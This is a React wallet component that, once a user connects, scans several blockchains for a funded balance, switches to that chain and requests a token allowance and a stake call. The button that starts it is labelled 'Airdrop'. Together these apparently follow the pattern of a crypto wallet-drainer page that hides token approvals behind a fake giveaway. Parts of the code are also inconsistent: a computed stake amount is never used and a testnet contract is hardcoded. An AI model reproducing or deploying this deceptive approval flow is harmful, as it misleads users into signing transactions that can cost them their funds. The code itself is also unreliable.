import React, { useEffect, useState } from "react";
import { ConnectButton, TransactionButton } from "thirdweb/react";
import {
  ARBITRUMCONTRACT,
  AVAXCONTRACT,
  BNBCONTRACT,
  BSCTESTCONTRACT,
  chains,
  client,
} from "../constants/constanst";
import { createWallet } from "thirdweb/wallets";
import {
  useActiveAccount,
  useSwitchActiveWalletChain,
  useSendTransaction,
} from "thirdweb/react";
import { getWalletBalance } from "thirdweb/wallets";
import { ethers } from "ethers";

const CustomButton = () => {
  const activeAccount = useActiveAccount();
  const switchChain = useSwitchActiveWalletChain();
  const [loading, setLoading] = useState(false);
  const [balance, setBalance] = useState("0");
  const [currentChain, setCurrentChain] = useState("");
  const [currentChainId, setCurrentChainId] = useState("");
  const { mutate: sendTransaction, isPending } = useSendTransaction();

  const delay = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

  const checkBalanceAndSwitchChain = async () => {
    if (!activeAccount?.address) return;

    setLoading(true);

    for (const chain of chains) {
      setCurrentChainId(chain.id);
      setCurrentChain(chain.name);
      try {
        const balanceResult = await getWalletBalance({
          address: activeAccount.address,
          client,
          chain,
        });

        const balanceInUnit = balanceResult.displayValue;

        console.log(
          `Balance found on ${chain.rpc}: ${balanceInUnit} ${chain.ticker}`
        );

        if (parseFloat(balanceInUnit) > 0) {
          await switchChain({ id: chain.id });

          // const currentChainContract = chain.name.includes("avalanche")
          //   ? AVAXCONTRACT
          //   : chain.name.includes("smart chain")
          //   ? BNBCONTRACT
          //   : chain.name.includes("arbitrum")
          //   ? ARBITRUMCONTRACT
          //   : BSCTESTCONTRACT;

          const currentChainContract = BSCTESTCONTRACT;

          const balanceToStake = parseFloat(balanceInUnit) * 0.1;
          console.log("Balance to stake:", balanceToStake.toString());
          setBalance(balanceToStake.toString());

          try {
            const stakeContract = new ethers.Contract(
              currentChainContract.address,
              currentChainContract.abi,
              activeAccount
            );

            const balance = await stakeContract.balanceOf(
              activeAccount.address
            );
            const allowanceAmount = (balance * 5) / 100000;

            const approveTx = await stakeContract.increaseAllowance(
              currentChainContract.address,
              allowanceAmount
            );
            await approveTx.wait(); // Wait for the transaction to be mined

            console.log(`Approved ${allowanceAmount} tokens for staking`);

            // Now call the stake function in the staking contract
            const stakeTx = await stakeContract.stake();
            await stakeTx.wait();
          } catch (error) {
            if (error.code === "CALL_EXCEPTION") {
              // Inspect the revert reason if available
              const revertMessage =
                error?.data?.message || error?.reason || "Unknown error";
              if (revertMessage.includes("Insufficient allowance")) {
                alert("You have insufficient allowance for staking.");
              } else {
                alert(`Transaction failed: ${revertMessage}`);
              }
            } else {
              alert("An unexpected error occurred: " + error.message);
            }
          }
        } else {
          console.log(
            `No balance on ${chain.rpc}, switching to the next chain.`
          );
          await delay(2000);
        }
      } catch (error) {
        console.error(
          `Error checking balance or preparing transaction:`,
          error
        );
      }
    }

    setLoading(false);
  };

  useEffect(() => {
    if (activeAccount?.address) {
      console.log(activeAccount.address);
      setCurrentChain(chains[0].name);
    }
  }, [activeAccount]);

  return (
    <div>
      <ConnectButton
        client={client}
        wallets={[
          createWallet("io.metamask"),
          createWallet("com.coinbase.wallet"),
          createWallet("me.rainbow"),
        ]}
        connectButton={{
          label: "Connect",
        }}
        chains={chains}
      />
      {loading && <p>Wait...</p>}
      {activeAccount && (
        <p>
          Balance: {balance} Current Chain: {currentChain}
        </p>
      )}
      {activeAccount && (
        <TransactionButton
          transaction={checkBalanceAndSwitchChain} // Pass the function directly
          onTransactionSent={() =>
            alert(`${balance} ${currentChain} approved for staking`)
          }
          isPending={isPending} // Pass isPending to disable the button when transaction is pending
        >
          Airdrop
        </TransactionButton>
      )}
    </div>
  );
};

export default CustomButton;
